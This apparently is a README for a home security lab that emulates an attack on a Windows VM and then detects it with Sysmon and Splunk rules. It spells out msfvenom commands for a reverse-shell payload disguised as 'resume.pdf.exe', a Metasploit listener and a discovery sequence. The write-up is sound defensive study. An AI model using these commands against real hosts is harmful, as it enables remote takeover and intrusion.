# Detection Engineering & SOC Telemetry Home Lab

An end-to-end cybersecurity home laboratory built using VirtualBox, Windows 10, Kali Linux, Sysmon, and Splunk Enterprise. This lab simulates real-world adversary behavior (reconnaissance, payload generation, command-and-control, post-exploitation) and captures endpoint telemetry using Microsoft Sysmon, and analyze process lineage and network artifacts inside Splunk Enterprise.

---

## Key Technologies & Tools

- **Hypervisor:** Oracle VM VirtualBox (v7.0+)
- **Attacker Node:** Kali Linux (64-bit pre-built VM)
- **Target Node:** Windows 10 Pro (x64)
- **Endpoint Telemetry:** Microsoft Sysmon (System Monitor)
- **SIEM / Log Analysis:** Splunk Enterprise & Splunk Add-on for Sysmon
- **Offensive Tooling:** Nmap, MSFvenom, Metasploit Framework (`exploit/multi/handler`)

---
## 🛠️ Lab Architecture & Network Topology

Both machines reside on an isolated internal network (`project`) with no external internet routing during payload execution to ensure safe sandbox conditions.

```text
+-----------------------------------------------------------------------------------------+
|                               Host Machine (Hypervisor)                                 |
|                                                                                         |
|   +----------------------------------+          +-----------------------------------+   |
|   |     Attacker VM: Kali Linux      |          |    Target VM: Windows 10 Pro      |   |
|   |         IP: 192.168.20.11        |          |  Hostname: DESKTOP-JCKQ6MH        |   |
|   |----------------------------------|          |  User: nik | IP: 192.168.20.10    |   |
|   | • Recon: Nmap                    |          |-----------------------------------|   |
|   | • Staging: Python HTTP Server    |  <====>  | • Host Endpoint                   |   |
|   | • Exploit: MSF Multi-Handler     | Internal | • Telemetry: Microsoft Sysmon     |   |
|   | • Payload: resume.pdf.exe        | Network  | • SIEM: Splunk Enterprise         |   |
|   +----------------------------------+          +-----------------------------------+   |
+-----------------------------------------------------------------------------------------+
```

---

## 🔧 Environment Configuration

### 1. Isolated VirtualBox Network Adapter Setup
To prevent malicious network traffic from escaping to the local LAN, both VMs are attached to an isolated **Internal Network** named `project`.

<img width="1600" height="900" alt="19d977f4-2a90-4b2a-8b64-b34e1eae83c9" src="https://github.com/user-attachments/assets/8c3b66f6-ea1f-4380-8da2-39273c82419d" />


### 2. Attacker Node Setup (Kali Linux)
- **Interface:** `eth0`
- **Assigned IP:** `192.168.20.11/24`
- **Method:** Statically defined in Network Manager.

<img width="1280" height="800" alt="cb3bde57-9f70-4ec4-b7eb-ca266ce1db68" src="https://github.com/user-attachments/assets/90edd4e9-dc0a-43d9-a90b-92593b796da3" />


### 3. Target Node Setup (Windows 10 Pro)
- **Hostname:** `DESKTOP-JCKQ6MH`
- **User Account:** `nik`
- **Assigned IP:** `192.168.20.10/24`

<img width="1280" height="720" alt="05f88366-d04a-41cc-b383-2fd3c3b03e55" src="https://github.com/user-attachments/assets/a1dfd4de-edbf-4259-8140-5fb8bc6bcd9e" />


### 4. Connectivity Verification
Verified static addressing via `ipconfig` and established round-trip ICMP connectivity by pinging the Kali Linux attacker host (`192.168.20.11`) with 0% packet loss.

<img width="1280" height="720" alt="43adf378-6186-45de-8ef9-491806fcd971" src="https://github.com/user-attachments/assets/2479efcd-a159-4dd6-b42c-9c57c4b15430" />


---

## ⚔️ Attack Phase & Adversary Emulation

### 1. Network Reconnaissance (Nmap)
Executed an aggressive service scan skipping host discovery (`-Pn`):

```bash
nmap -A -Pn 192.168.20.10
```

<img width="1280" height="800" alt="8871e8b9-65c3-4fe1-9e94-40e008d07059" src="https://github.com/user-attachments/assets/6707fa99-82b7-4e7f-b7a5-ac30b446b453" />



**Open Services Identified:**
- `135/tcp` (Microsoft Windows RPC)
- `139/tcp` & `445/tcp` (SMB / NetBIOS)
- `3389/tcp` (Microsoft Terminal Services / RDP — Host: `DESKTOP-JCKQ6MH`)
- `5432/tcp` (PostgreSQL / Splunk DB Service)

---

### 2. Staging C2 & Listener Setup

Generated an x64 reverse TCP payload with a double extension disguise:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.20.11 LPORT=4444 \
  -f exe -o resume.pdf.exe
```

Staged the payload with `python3 -m http.server 9999` and started Metasploit's multi-handler:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
exploit
```

Upon victim execution, Meterpreter caught the incoming stage and spawned an interactive shell:

<img width="1280" height="800" alt="bbd07574-eb79-49bc-a870-26dd16581246" src="https://github.com/user-attachments/assets/125681da-3bf6-4d24-8bda-43ddf161087a" />


---

### 3. Post-Exploitation Discovery
From the interactive command shell, executed initial reconnaissance commands:

```cmd
net user
net localgroup administrators
ipconfig
```

<img width="1600" height="722" alt="446c8c68-a1ed-4305-b315-0b3072516581" src="https://github.com/user-attachments/assets/2765a4b7-1921-48dc-9868-384cd189b17d" />


---

## 🔍 Telemetry Ingestion & Splunk Investigation

### 1. Sysmon Ingestion Pipeline
Sysmon operational logs are forwarded into Splunk Enterprise and routed to the dedicated `endpoint` index.

```ini
# inputs.conf
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
renderXml = 1
index = endpoint
```

<img width="1600" height="780" alt="be8edb84-d017-4601-ba35-9469ffccff26" src="https://github.com/user-attachments/assets/781b6be7-d52a-4b43-85b2-16b8b99034c2" />


---

### 2. Process Lineage Reconstruction (Event ID 1)

To isolate the adversary process execution chain, the following SPL query was run:

```spl
index=endpoint EventCode=1 NOT ParentImage=*Splunk* ("resume.pdf*" OR "net*" OR "ipconfig*")
| table _time, ParentImage, Image, CommandLine
| sort _time
```

<img width="1600" height="900" alt="17710ea8-065a-44fc-a601-dff768bbb9d0" src="https://github.com/user-attachments/assets/a0d37877-4743-4403-a266-861b0cec2efa" />


#### Observed Process Tree Breakdown

| Timestamp (UTC) | Parent Image | Executed Image | CommandLine | MITRE ATT&CK Mapping |
| :--- | :--- | :--- | :--- | :--- |
| `05:02:17` | `C:\Windows\explorer.exe` | `...\resume.pdf (1).exe` | `"...\resume.pdf (1).exe"` | **T1204.002:** Malicious File |
| `05:02:48` | `...\resume.pdf (1).exe` | `C:\Windows\System32\cmd.exe` | `C:\Windows\system32\cmd.exe` | **T1059.003:** Windows Command Shell |
| `05:02:59` | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\net.exe` | `net user` | **T1087.001:** Local Account Discovery |
| `05:02:59` | `C:\Windows\System32\net.exe` | `C:\Windows\System32\net1.exe` | `C:\Windows\system32\net1 user` | Legacy execution wrapper |
| `05:03:00` | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\net.exe` | `net localgroup administrators` | **T1069.001:** Local Groups Discovery |
| `05:03:00` | `C:\Windows\System32\net.exe` | `C:\Windows\System32\net1.exe` | `C:\Windows\system32\net1 localgroup administrators` | Legacy execution wrapper |

---

## 🛡️ Detection Engineering Rules

### 1. Masqueraded Executable Execution
```spl
index=endpoint EventCode=1 
| regex Image="(?i)\.(pdf|docx|xlsx|txt)\.exe$"
| table _time Computer User ParentImage Image CommandLine
```

### 2. Shell Spawned by User-Space Executable
```spl
index=endpoint EventCode=1 Image="*\\cmd.exe" OR Image="*\\powershell.exe"
| where match(ParentImage, "(?i)Users\\\\.*\\\\(Downloads|Desktop|AppData)")
| table _time Computer ParentImage Image CommandLine
```

### 3. Rapid Account Discovery Execution
```spl
index=endpoint EventCode=1 Image IN ("*\\net.exe", "*\\net1.exe", "*\\whoami.exe") 
  CommandLine IN ("*user*", "*localgroup*", "*administrators*")
| stats count earliest(_time) as start latest(_time) as end values(CommandLine) by Computer, ParentProcessGuid
| where count >= 2
```

## Detection Engineering Takeaways

1. **Masquerading Extensions:** Binaries with double extensions (e.g., `.pdf.exe`) highlight why `Hide extensions for known file types` should be disabled across enterprise fleet configurations.
2. **Parent-Child Process Anomalies:** Executable files running from user download directories and spawning `cmd.exe` or `powershell.exe` represent high-fidelity alert candidates.
3. **Discovery Commands:** Rapid successive executions of `net user`, `net localgroup`, and `ipconfig` by a non-system user often signal immediate post-compromise enumeration.

---

## References

- [MyDFIR YouTube Series - Build a Basic Home Lab (1/3)](http://www.youtube.com/watch?v=kku0fVfksrk)
- [MyDFIR YouTube Series - Build a Basic Home Lab (2/3)](http://www.youtube.com/watch?v=5iafC6vj7kM)
- [MyDFIR YouTube Series - Build a Basic Home Lab (3/3)](http://www.youtube.com/watch?v=-8X7Ay4YCoA)
- [Microsoft Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Configuration](https://github.com/SwiftOnSecurity/sysmon-config)
